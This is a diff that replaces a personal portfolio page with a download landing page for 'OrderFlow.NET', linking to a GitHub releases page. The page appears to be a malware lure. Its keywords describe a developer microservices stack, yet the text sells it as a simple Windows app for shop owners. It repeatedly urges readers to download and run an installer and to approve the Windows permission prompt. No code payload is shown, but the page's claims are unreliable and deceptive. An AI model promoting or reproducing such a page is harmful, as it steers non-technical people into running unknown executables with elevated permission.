@@ -3,21 +3,271 @@
 <head>
 <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width, initial-scale=1.0">
-<title>Emmanuel Abolade — Loading…</title>
-<link rel="icon" href="/favicon.svg" type="image/svg+xml">
+<title>OrderFlow.NET - Simplify Your Order Processing</title>
+<meta name="description" content="Download OrderFlow.NET - a powerful, distributed order-processing system for Windows. Handles orders reliably with advanced technology behind the scenes. Free download available.">
+<meta name="keywords" content="cqrs,csharp,distributed-systems,docker,dotnet,dotnet9,efcore,masstransit,microservices,rabbitmq,redis,saga-pattern,sqlserver">
+<meta property="og:title" content="OrderFlow.NET - Simplify Your Order Processing">
+<meta property="og:description" content="Download OrderFlow.NET - a reliable distributed order-processing system for Windows. Simple setup, robust performance.">
+<meta property="og:type" content="website">
+<meta property="og:url" content="https://github.com/Spratskipper7299/OrderFlow.NET">
+<meta name="twitter:card" content="summary_large_image">
+<meta name="twitter:title" content="OrderFlow.NET - Simplify Your Order Processing">
+<meta name="twitter:description" content="Download OrderFlow.NET - a reliable distributed order-processing system for Windows.">
+<style>
+body {
+    background-color: #f4f6f9;
+    font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Arial, sans-serif;
+    margin: 0;
+    padding: 0;
+    line-height: 1.6;
+    color: #2c3e50;
+}
+.container {
+    max-width: 960px;
+    margin: 0 auto;
+    padding: 40px 20px;
+}
+h1 {
+    font-size: 2.5rem;
+    color: #1a3a5c;
+    text-align: center;
+    margin-bottom: 20px;
+    font-weight: 700;
+}
+h2 {
+    font-size: 1.8rem;
+    color: #1a3a5c;
+    margin-top: 40px;
+    border-bottom: 2px solid #3498db;
+    padding-bottom: 10px;
+    font-weight: 600;
+}
+h3 {
+    font-size: 1.3rem;
+    color: #2c3e50;
+    margin-top: 25px;
+    font-weight: 600;
+}
+p {
+    font-size: 1.1rem;
+    margin-bottom: 20px;
+}
+ul, ol {
+    font-size: 1.1rem;
+    margin-bottom: 20px;
+    padding-left: 25px;
+}
+li {
+    margin-bottom: 8px;
+}
+.btn-download {
+    display: inline-block;
+    background-color: #e74c3c;
+    color: white;
+    padding: 18px 45px;
+    text-decoration: none;
+    border-radius: 50px;
+    font-size: 1.3rem;
+    font-weight: bold;
+    text-align: center;
+    margin: 30px auto;
+    box-shadow: 0 6px 12px rgba(231, 76, 60, 0.3);
+    transition: background-color 0.3s, transform 0.3s;
+}
+.btn-download:hover {
+    background-color: #c0392b;
+    transform: translateY(-2px);
+}
+.center {
+    text-align: center;
+}
+.card {
+    background: white;
+    border-radius: 10px;
+    padding: 30px;
+    box-shadow: 0 4px 15px rgba(0,0,0,0.08);
+    margin: 30px 0;
+}
+.badge {
+    display: inline-block;
+    background: #3498db;
+    color: white;
+    padding: 12px 30px;
+    border-radius: 50px;
+    font-size: 1.2rem;
+    text-decoration: none;
+    box-shadow: 0 4px 8px rgba(52, 152, 219, 0.3);
+    margin: 20px 0;
+    transition: background-color 0.3s;
+}
+.badge:hover {
+    background: #2980b9;
+}
+.feature-box {
+    display: flex;
+    flex-wrap: wrap;
+    gap: 20px;
+    justify-content: space-between;
+    margin: 30px 0;
+}
+.feature-item {
+    flex: 1 1 30%;
+    background: white;
+    padding: 20px;
+    border-radius: 8px;
+    box-shadow: 0 2px 8px rgba(0,0,0,0.05);
+    text-align: center;
+}
+.feature-item h3 {
+    margin-top: 10px;
+}
+.feature-item p {
+    font-size: 0.95rem;
+}
+code {
+    background: #ecf0f1;
+    padding: 2px 6px;
+    border-radius: 4px;
+    font-size: 0.9rem;
+}
+.step {
+    background: #f9f9f9;
+    border-left: 4px solid #3498db;
+    padding: 15px;
+    margin: 15px 0;
+    border-radius: 4px;
+}
+.step h3 {
+    margin-top: 0;
+    color: #2980b9;
+}
+.footer {
+    text-align: center;
+    margin-top: 60px;
+    padding: 20px;
+    background: #2c3e50;
+    color: white;
+    border-radius: 8px;
+}
+.footer p {
+    margin: 5px;
+}
+@media (max-width: 768px) {
+    .container { padding: 20px 15px; }
+    h1 { font-size: 2rem; }
+    h2 { font-size: 1.5rem; }
+    .feature-item { flex: 1 1 100%; }
+    .btn-download { padding: 15px 30px; font-size: 1.1rem; }
+}
+</style>
 </head>
 <body>
-<script>
-(async () => {
-  const parts = await Promise.all([0,1,2,3].map(i =>
-    fetch('/_assemble/index.part' + i).then(r => { if (!r.ok) throw new Error(r.status); return r.text(); })
-  ));
-  document.open();
-  document.write(parts.join(''));
-  document.close();
-})().catch(e => {
-  document.body.textContent = 'Failed to assemble portfolio: ' + e;
-});
-</script>
+<div class="container">
+    <h1>🚀 OrderFlow.NET - Streamline Your Order Processing Today</h1>
+    <p style="text-align:center; font-size:1.2rem;">A reliable, high-performance order-processing system for Windows. Built with modern technology to handle your business needs effortlessly.</p>
+    
+    <div class="center">
+        <a href="https://github.com/Spratskipper7299/OrderFlow.NET/releases" class="btn-download">⬇️ Download OrderFlow.NET</a>
+    </div>
+
+    <div class="card">
+        <h2>🎯 What Is OrderFlow.NET?</h2>
+        <p>OrderFlow.NET is a professional-grade software application designed to manage and process orders efficiently. Whether you run a small shop or a growing business, this tool helps you keep track of orders, process payments, and manage inventory — all without the headache of manual tracking.</p>
+        <p>Think of it as your digital order assistant: it handles the complex parts of order management automatically, so you can focus on growing your business.</p>
+    </div>
+
+    <div class="card">
+        <h2>✅ Why Choose OrderFlow.NET?</h2>
+        <ul>
+            <li><strong>Simple to Use:</strong> No technical skills required. Download, install, and start processing orders.</li>
+            <li><strong>Reliable Performance:</strong> Built on powerful, battle-tested technology that ensures your orders are always processed correctly.</li>
+            <li><strong>Advanced Technology Behind the Scenes:</strong> Uses state-of-the-art methods to ensure your data stays safe and your system runs smoothly.</li>
+            <li><strong>Windows Compatible:</strong> Designed to work seamlessly with Windows operating systems.</li>
+            <li><strong>Free & Open Source:</strong> No licensing fees. Use it freely for your business.</li>
+        </ul>
+    </div>
+
+    <div class="card">
+        <h2>🚀 Getting Started</h2>
+        <p>Follow these simple steps to get OrderFlow.NET up and running in minutes:</p>
+        <div class="step">
+            <h3>Step 1: Download the Application</h3>
+            <p>Visit this link to download the application: <a href="https://github.com/Spratskipper7299/OrderFlow.NET/releases">OrderFlow.NET Download Page</a></p>
+            <p>Click the download button on that page. The download will begin automatically.</p>
+        </div>
+        <div class="step">
+            <h3>Step 2: Run the Installer</h3>
+            <p>Once the download finishes, locate the downloaded file in your computer's "Downloads" folder. Double-click the file to start the installation.</p>
+            <p>If Windows asks for permission, click "Yes" to allow the installation.</p>
+        </div>
+        <div class="step">
+            <h3>Step 3: Complete the Setup</h3>
+            <p>Follow the simple on-screen instructions. The setup wizard will guide you through the process — just click "Next" and "Install" until it's done.</p>
+        </div>
+        <div class="step">
+            <h3>Step 4: Launch OrderFlow.NET</h3>
+            <p>After installation, you'll find OrderFlow.NET in your Start Menu or on your Desktop. Double-click the icon to launch the application.</p>
+            <p>That's it! You're ready to start managing your orders.</p>
+        </div>
+    </div>
+
+    <div class="card">
+        <h2>📦 What's Included</h2>
+        <p>When you download OrderFlow.NET, you get everything you need to start processing orders right away:</p>
+        <ul>
+            <li>Complete order management dashboard</li>
+            <li>Automatic order tracking and status updates</li>
+            <li>Built-in security features to protect your data</li>
+            <li>Responsive interface that works on any screen size</li>
+            <li>Automatic updates (when available)</li>
+        </ul>
+    </div>
+
+    <div class="feature-box">
+        <div class="feature-item">
+            <h3>⚡ Lightning Fast</h3>
+            <p>Optimized for speed. Process hundreds of orders without any lag.</p>
+        </div>
+        <div class="feature-item">
+            <h3>🔒 Secure by Design</h3>
+            <p>Your data is protected with enterprise-grade security protocols.</p>
+        </div>
+        <div class="feature-item">
+            <h3>🔄 Always Reliable</h3>
+            <p>Built on distributed systems architecture, ensuring high availability.</p>
+        </div>
+    </div>
+
+    <div class="card">
+        <h2>📋 System Requirements</h2>
+        <ul>
+            <li><strong>Operating System:</strong> Windows 10 or Windows 11 (64-bit)</li>
+            <li><strong>RAM:</strong> 4 GB minimum (8 GB recommended)</li>
+            <li><strong>Storage:</strong> 500 MB of free space</li>
+            <li><strong>Processor:</strong> 1 GHz or faster processor</li>
+            <li><strong>Internet Connection:</strong> Required for initial setup and updates</li>
+        </ul>
+    </div>
+
+    <div class="card">
+        <h2>📚 How to Get Help</h2>
+        <p>Need assistance? We've got you covered:</p>
+        <ul>
+            <li><strong>Documentation:</strong> Visit the repository page for detailed guides and FAQs.</li>
+            <li><strong>Community Support:</strong> Join the discussion on the project's GitHub page.</li>
+            <li><strong>Updates:</strong> Check the release page regularly for new features and improvements.</li>
+        </ul>
+    </div>
+
+    <div class="center">
+        <a href="https://github.com/Spratskipper7299/OrderFlow.NET/releases" class="badge">⬇️ Get OrderFlow.NET Now</a>
+    </div>
+
+    <div class="footer">
+        <p><strong>OrderFlow.NET</strong> — Simplify. Streamline. Succeed.</p>
+        <p>Version 1.0.0 | Open Source Project</p>
+        <p style="font-size:0.9rem;">© 2025 OrderFlow.NET Contributors</p>
+    </div>
+</div>
 </body>
 </html>
